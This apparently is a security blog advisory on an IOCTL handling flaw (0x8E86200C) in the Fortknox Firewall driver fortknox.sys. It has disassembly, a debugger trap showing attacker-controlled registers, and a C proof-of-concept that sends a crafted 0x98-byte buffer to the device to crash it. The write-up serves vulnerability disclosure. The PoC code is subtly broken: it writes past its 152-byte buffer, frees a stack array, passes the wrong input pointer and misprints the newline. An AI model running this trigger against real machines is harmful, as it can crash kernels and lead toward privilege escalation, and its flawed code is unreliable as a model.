---
layout: post
title:  "Fortknox Firewall - IOCTL Handling Vulnerability"
categories: 
tags:
  - driver
  - ioctl
---

Description
-----------
Fortknox Firewall prone to vulnerable with IOCTL handling vulnerability. It is found that the vulnerability could lead to code execution. 
The affected module found was the **fortknox.sys** with vulnerable IOCTL **0x8E86200C**.

Vulnerability Analysis
----------------------
Inspecting the vulnerable IOCTL code:
```
  .text:0001600D                 cmp     eax, 8E86200Ch ; vulnerable IOCTL 
  .text:00016012                 jz      short loc_1604D
```
Check input size buffer **0x98** send thru vulnerable IOCTL. It then continue for another check on **sub_150E4**.
``` 
  .text:0001604D                 cmp     ecx, 98h           ; input check here
  .text:00016053                 jnz     loc_16276
  .text:00016059                 mov     eax, [ebp+arg_4]   ; our input 
  .text:0001605C                 cmp     eax, ebx
  .text:0001605E                 jz      loc_16276          ; check for the input from IOCTL sent
  .text:00016064                 push    eax
  .text:00016065                 push    dword ptr [eax]
  .text:00016067                 call    sub_150E4
```
Vulnerable path where it failed to handle the IOCTL input **0x98**:
```
  .text:0001518D                 push    31565244h       ; Tag
  .text:00015192                 push    98h             ; NumberOfBytes
  .text:00015197                 push    edi             ; PoolType
  .text:00015198                 call    ds:ExAllocatePoolWithTag
  .text:0001519E                 mov     ebx, eax
  .text:000151A0                 cmp     ebx, edi
  .text:000151A2                 jz      short loc_1512F
  .text:000151A4                 mov     eax, [ebp+arg_4]
  .text:000151A7                 push    26h
  .text:000151A9                 mov     esi, eax
  .text:000151AB                 pop     ecx
  .text:000151AC                 mov     edi, ebx
  .text:000151AE                 rep movsd                  ; memcpy() function here
  .text:000151B0                 mov     eax, [eax+90h]
  .text:000151B6                 test    eax, eax
  .text:000151B8                 jz      short loc_151F6
  .text:000151BA                 lea     esi, [eax+1]       ; here we can see the buffer bytes is 0x98
  .text:000151BD                 mov     cl, [eax]          ; crashed at this part and overwrite data on EAX
  .text:000151BF                 inc     eax                ; attacker can leverage this part where increase the bytes and overwrite 
                                                            ; data here for shellcode, etc.
  .text:000151C0                 test    cl, cl
  .text:000151C2                 jnz     short loc_151BD
```
Successful triggering the crash with capable control and overwrite ESI and EAX:
```
  kd> .trap 0xffffffffa13d4950
  ErrCode = 00000000
  eax=41414141 ebx=a0de6aa0 ecx=00000000 edx=0000169e esi=41414142 edi=a0de6b38
  eip=8cafd1bd esp=a13d49c4 ebp=a13d49d4 iopl=0         nv up ei pl nz na pe nc
  cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010206
  fortknoxfw+0x51bd:
  8cafd1bd 8a08            mov     cl,byte ptr [eax]          ds:0023:41414141=??
```
  
Proof-of-Concept
----------------
To compile, use Visual Studio command prompt: ```cl.exe /nologo code.c```
```
#include <stdio.h>
#include <windows.h>

void main()
{
  ULONG   InBuf = 0;
   DWORD   dwRetbytes = 0;
  BYTE  buff[0x98];
  
  HANDLE hdev = CreateFileA("\\\\.\\fortknoxfw_ctl", GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, NULL);
    
  if (hdev==INVALID_HANDLE_VALUE)
  {
        printf("CreateFile Failed: %d/n",GetLastError());
  }
    
  memset(buff, 'A', 0x98);
  memset(buff + 100, 'B', 4);
  memset(buff + 200, 'C', 4);

  DeviceIoControl(hdev, 0x8e86200c, &InBuf, 0x98, buff, 0x98, &dwRetbytes, NULL);
  free(buff);
}
```
